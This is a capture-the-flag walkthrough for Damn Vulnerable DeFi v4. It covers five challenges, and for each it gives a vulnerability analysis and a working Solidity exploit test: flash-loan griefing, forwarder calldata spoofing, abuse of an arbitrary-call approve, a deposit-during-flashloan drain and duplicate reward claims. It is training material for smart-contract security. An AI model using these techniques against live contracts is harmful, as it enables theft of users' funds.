# Damn Vulnerable DeFi v4 Walkthorugh

## 1.UNSTOPPABLE
Starting with 10 DVT tokens in balance, show that it’s possible to halt the vault. It must stop offering flash loans. _See [challenges/unstoppable/](https://www.damnvulnerabledefi.xyz/challenges/unstoppable/)_

### Objective
_from `_isSolved()`in test_
1. _Flashloan check must fail_

### Attack Analysis

- The balance of `UnstoppableVault` is not accounted for unexpected changes (e.g. force feeding ERC20 tokens), by just transfering a small amount to the vault, the below condition fail and revert

### PoC

```solidity
function test_unstoppable() public checkSolvedByPlayer {
    token.transfer(address(vault), 1e18);
}
```
_See [test/unstoppable/Unstoppable.t.sol](https://github.com/CanonicalJP/damn-vulnerable-defi-v4/blob/master/test/unstoppable/Unstoppable.t.sol)_

----
## 2.NAIVE RECEIVER

### Objective
_from `_isSolved()`in test_
1. _Player must have executed two or less transactions_
2. _The flashloan receiver contract has been emptied_
3. _Pool is empty too_
4. _All funds sent to recovery account_

### Attack Analysis
- The vulnerability is that the `onFlashLoan` function in `FlashLoanReceiver` doesn't verify the authorization of the flash loan's origin. By executing 10 flash loans with an amount of 0, we can deplete the FlashLoanReceiver's 10 ETH. However, the constraint is that the Nonce must be under 2. Since `NaiveReceiverPool` supports `Multicall`, we can leverage it to conduct all 10 flash loan operations in a single transaction, thereby meeting the Nonce requirement.
- The next step is to extract the initial 1000 ETH from the NaiveReceiverPool. The only way to transfer assets is through the `withdraw` function. For this function to execute, `_msgSender` must meet the conditions where `msg.sender` equals `trustedForwarder` and `msg.data.length` is at least 20 bytes, which leaves room for tampering.
- Lastly, using a forwarder to execute a meta-transaction, the `msg.sender == trustedForwarder` condition can be met.

### POC

```solidity
 function test_naiveReceiver() public checkSolvedByPlayer {
        bytes[] memory callDataArray = new bytes[](11);
        for (uint256 i = 0; i < 10; i++) {
            callDataArray[i] = abi.encodeCall(NaiveReceiverPool.flashLoan, (receiver, address(weth), 0, "0x"));
        }
        callDataArray[10] = abi.encodePacked(
            abi.encodeCall(NaiveReceiverPool.withdraw, (WETH_IN_POOL + WETH_IN_RECEIVER, payable(recovery))),
            bytes32(uint256(uint160(deployer)))
        );

        bytes memory callData;
        callData = abi.encodeCall(pool.multicall, callDataArray);

        BasicForwarder.Request memory request =
            BasicForwarder.Request(player, address(pool), 0, gasleft(), forwarder.nonces(player), callData, 1 days);

        bytes32 requestHash =
            keccak256(abi.encodePacked("\x19\x01", forwarder.domainSeparator(), forwarder.getDataHash(request)));

        (uint8 v, bytes32 r, bytes32 s) = vm.sign(playerPk, requestHash);
        bytes memory signature = abi.encodePacked(r, s, v);

        forwarder.execute(request, signature);
    }
```
See [test/naive-receiver/NaiveReceiver.t.sol](https://github.com/CanonicalJP/damn-vulnerable-defi-v4/blob/master/test/naive-receiver/NaiveReceiver.t.sol)

---- 
## 3.TRUSTER

### Objective
_from `_isSolved()`in test_
1. _Player must have executed a single transaction_
2. _All rescued funds sent to recovery account_

### Attack Analysis
- The vulnerability resides in `flashLoan()` in `TrusterLenderPool`, which includes a call to an arbitrary address with arbitrary data, `target.functionCall(data)`. We can use it to call the token and `approve()` the contract we want to later call the token and do a `transferFrom`.
- Lastly, we need to execute the attack in one ATOMIC transaction. To complete this objective, the best approach is to execute the code in the `constructor()` of a contract. 

### POC
```solidity
function test_truster() public checkSolvedByPlayer {
    AttackTruster attackTruster = new AttackTruster(address(pool), address(token), recovery, TOKENS_IN_POOL);
}

contract AttackTruster {
    constructor (address _pool, address _token, address _recovery, uint256 tokens) payable {
        TrusterLenderPool pool = TrusterLenderPool(_pool);
        bytes memory data = abi.encodeWithSignature("approve(address,uint256)", address(this), tokens);
        pool.flashLoan(0, address(this), _token, data);
        DamnValuableToken token = DamnValuableToken(_token);
        token.transferFrom(_pool, _recovery, tokens);
    }
}
```
See [test/naive-receiver/Truster.t.sol](https://github.com/CanonicalJP/damn-vulnerable-defi-v4/blob/master/test/naive-receiver/Truster.t.sol)

----
## 4.SIDE ENTRANCE

### Objective
_from `_isSolved()`in test_
1. _All rescued funds sent to recovery account_

### Attack Analysis
- The attack can be executed by asking a flahs loan through `flashLoan()`and then depositing the total value in the same call using `deposit()`.

### POC
```solidity
function test_sideEntrance() public checkSolvedByPlayer {
    Attack attackPool = new Attack(address(pool));
    attackPool.exploit(ETHER_IN_POOL, recovery);
}

contract Attack {
    SideEntranceLenderPool private pool;

    constructor (address _pool) {
        pool = SideEntranceLenderPool(_pool);
    }

    receive() external payable {}

    function execute() external payable {
        pool.deposit{value: msg.value}();
    }

    function exploit(uint256 _amount, address _recovery) external{
        pool.flashLoan(_amount);
        pool.withdraw();
        (bool success, ) = _recovery.call{value: _amount}("");
        if(!success) console.log("Transfer failed");
    }
}
```
See [test/side-entrance/SideEntrance.t.sol](https://github.com/CanonicalJP/damn-vulnerable-defi-v4/blob/master/test/side-entrance/SideEntrance.t.sol)

----
## 5.THE REWARDER

### Objective
_from `_isSolved()`in test_
1. _Player saved as much funds as possible, perhaps leaving some dust_
2. _All funds sent to the designated recovery account_

### Attack Analysis
- The vulnerability exists in the `claimRewards()` function, which processes multiple claims in a single transaction.
- The function transfers rewards for each claim iteration but only marks claims as processed after the final occurrence by calling `_setClaimed()`. This allows malicious actors to submit multiple identical claims, receiving multiple payouts before the system recognizes the claim as processed.
- The exploit requires the attacker to have at least one valid, unclaimed reward and sufficient contract funds for multiple payouts.
- The attack involves creating an array of identical claim objects, calling `claimRewards()` with this array, and immediately withdrawing the exploited funds.

### POC
```solidity
function test_theRewarder() public checkSolvedByPlayer {
    uint PLAYER_DVT_CLAIM_AMOUNT = 11524763827831882;
    uint PLAYER_WETH_CLAIM_AMOUNT = 1171088749244340;

    bytes32[] memory dvtLeaves = _loadRewards("/test/the-rewarder/dvt-distribution.json");
    bytes32[] memory wethLeaves = _loadRewards("/test/the-rewarder/weth-distribution.json");

    uint dvtTxCount = TOTAL_DVT_DISTRIBUTION_AMOUNT /  PLAYER_DVT_CLAIM_AMOUNT;
    uint wethTxCount = TOTAL_WETH_DISTRIBUTION_AMOUNT / PLAYER_WETH_CLAIM_AMOUNT;
    uint totalTxCount = dvtTxCount + wethTxCount;

    IERC20[] memory tokensToClaim = new IERC20[](2);
    tokensToClaim[0] = IERC20(address(dvt));
    tokensToClaim[1] = IERC20(address(weth));

    // Create Alice's claims
    console.log(totalTxCount);
    Claim[] memory claims = new Claim[](totalTxCount);

    for (uint i = 0; i < totalTxCount; i++) {
        if (i < dvtTxCount) {
            claims[i] = Claim({
                batchNumber: 0, // claim corresponds to first DVT batch
                amount: PLAYER_DVT_CLAIM_AMOUNT,
                tokenIndex: 0, // claim corresponds to first token in `tokensToClaim` array
                proof: merkle.getProof(dvtLeaves, 188) //player at index 188
            });
        } else {
            claims[i] = Claim({
                batchNumber: 0, // claim corresponds to first DVT batch
                amount: PLAYER_WETH_CLAIM_AMOUNT,
                tokenIndex: 1, // claim corresponds to first token in `tokensToClaim` array
                proof: merkle.getProof(wethLeaves, 188)  //player at index 188
            });
        }
    }
    //multiple claims
    distributor.claimRewards({inputClaims: claims, inputTokens: tokensToClaim});

    dvt.transfer(recovery, dvt.balanceOf(player));
    weth.transfer(recovery, weth.balanceOf(player));
}
```
See [test/the-rewarder/TheRewarder.t.sol](https://github.com/CanonicalJP/damn-vulnerable-defi-v4/blob/master/test/the-rewarder/TheRewarder.t.sol)